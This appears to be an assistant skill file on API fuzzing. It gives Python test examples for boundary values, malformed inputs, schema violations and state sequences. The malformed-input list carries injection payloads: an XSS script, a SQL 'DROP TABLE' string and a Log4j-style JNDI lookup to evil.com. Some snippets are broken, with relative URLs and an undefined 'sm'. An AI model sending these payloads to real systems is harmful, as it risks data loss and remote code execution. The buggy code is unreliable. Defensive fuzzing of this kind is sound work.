---
name: Generate API Fuzzing Scenarios
version: 1.0.0
author: Mathias Paulenko Echeverz
description: Generate API fuzzing test scenarios using property-based and generative testing. Covers boundary values, malformed inputs, injection attempts, and schema violations.
tags: [fuzzing, api-testing, security, property-based, generative]
role: qa-engineer
model: any
trigger: When the user asks about API fuzzing, property-based testing, generative testing, or fuzz test scenarios.
---

# Generate API Fuzzing Scenarios

Design fuzzing tests to find edge cases, crashes, and security vulnerabilities in APIs.

## Fuzzing Categories

### 1. Boundary Value Fuzzing

```python
# Python with Hypothesis
from hypothesis import given, strategies as st
import requests

@given(
    page=st.one_of(
        st.just(0),           # Boundary: zero
        st.just(1),           # Boundary: first
        st.just(100),         # Boundary: max valid
        st.just(101),         # Boundary: max+1
        st.just(-1),          # Boundary: negative
        st.just(999999999),   # Very large
    )
)
def test_pagination_boundary(page):
    res = requests.get(f"/products?page={page}")
    assert res.status_code in [200, 400, 422]

@given(
    limit=st.one_of(
        st.just(0),
        st.just(1),
        st.just(50),   # Typical max
        st.just(51),
        st.just(1000),
    )
)
def test_limit_boundary(limit):
    res = requests.get(f"/products?limit={limit}")
    if limit > 50:
        assert res.status_code in [400, 422]
```

### 2. Malformed Input Fuzzing

```python
import random
import string

def fuzz_string():
    strategies = [
        lambda: "",                          # Empty
        lambda: "   ",                      # Whitespace
        lambda: "\x00",                     # Null byte
        lambda: "<script>alert(1)</script>",  # XSS
        lambda: "'; DROP TABLE users; --",    # SQL injection
        lambda: random.choice(string.printable) * 10000,  # Very long
        lambda: "\u0000\uFFFF",              # Unicode extremes
        lambda: "${jndi:ldap://evil.com}",   # Log4j-style
    ]
    return random.choice(strategies)()

def test_search_fuzzing():
    for _ in range(100):
        payload = fuzz_string()
        res = requests.post("/search", json={"query": payload})
        assert res.status_code in [200, 400, 422]
        # Should never crash (500)
        assert res.status_code != 500
```

### 3. Schema Violation Fuzzing

```python
# Python with schemathesis
import schemathesis
from schemathesis import hooks

schema = schemathesis.from_path("openapi.yaml")

@schema.parametrize()
def test_api(case):
    case.call_and_validate()

# Custom strategy: send wrong types
@schema.parametrize()
def test_type_confusion(case):
    if case.endpoint == "/users":
        case.body = {
            "email": 12345,        # Should be string
            "age": "twenty",       # Should be int
            "active": "yes"       # Should be bool
        }
    response = case.call()
    assert response.status_code in [400, 422]
```

### 4. State Machine Fuzzing

```python
# Model API as state machine
class APIStateMachine:
    def __init__(self):
        self.created_users = []
        self.auth_token = None

    def create_user(self):
        res = requests.post("/users", json={"name": "Alice"})
        if res.status_code == 201:
            self.created_users.append(res.json()["id"])
        return res

    def delete_user(self):
        if not self.created_users:
            return None
        user_id = random.choice(self.created_users)
        res = requests.delete(f"/users/{user_id}")
        if res.status_code == 200:
            self.created_users.remove(user_id)
        return res

    def get_user(self):
        user_id = random.choice(self.created_users) if self.created_users else 99999
        return requests.get(f"/users/{user_id}")

# Fuzz: random sequence of operations
for _ in range(1000):
    action = random.choice([sm.create_user, sm.delete_user, sm.get_user])
    response = action()
    assert response.status_code != 500
```

## Tools

| Tool | Language | Best For |
|------|----------|----------|
| **Hypothesis** | Python | Property-based testing |
| **schemathesis** | Python | OpenAPI fuzzing |
| **QuickCheck** | Haskell/JS | Generative testing |
| **RESTler** | Any (Microsoft) | Stateful REST fuzzing |
| **Jazzer** | Java/JVM | JVM fuzzing with libFuzzer |
| **OWASP ZAP** | Any | Active scanning, injection |

## Output

Provide:
1. Fuzzing strategy per endpoint (boundary, malformed, schema, state)
2. Code examples in target language
3. Expected behavior (400/422, never 500)
4. Security-focused payloads (injection, XSS, path traversal)
5. CI integration command
